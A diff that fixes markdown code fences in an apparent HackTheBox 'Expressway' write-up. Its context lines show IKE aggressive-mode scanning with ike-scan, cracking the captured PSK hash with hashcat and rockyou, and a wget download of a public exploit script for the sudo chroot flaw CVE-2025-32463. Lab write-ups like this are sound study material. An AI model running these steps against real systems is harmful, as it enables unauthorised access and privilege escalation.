@@ -22,7 +22,7 @@ https://infinitelogins.com/2020/12/08/enumerating-ipsec-ike-isakmp-ports-500-450
 
 ```
 sudo ike-scan $target
-```bash
+```
 ```bash
 ares@legion:~/HackTheBox/Expressway$ ike-scan --aggressive $target
 ```
@@ -72,7 +72,7 @@ Hash mode #5400
   Deprecated..........: No
   Deprecated.Notice...: N/A
   Password.Type.......: plain
-```bash
+```
 ```
 hashcat -m 5400 -a 0 output.txt /usr/share/wordlists/rockyou.txt
 ```bash
@@ -90,7 +90,7 @@ https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-p
 
 ```bash
 wget https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/raw/main/sudo-chwoot.sh
-```bash
+```
 
 
 
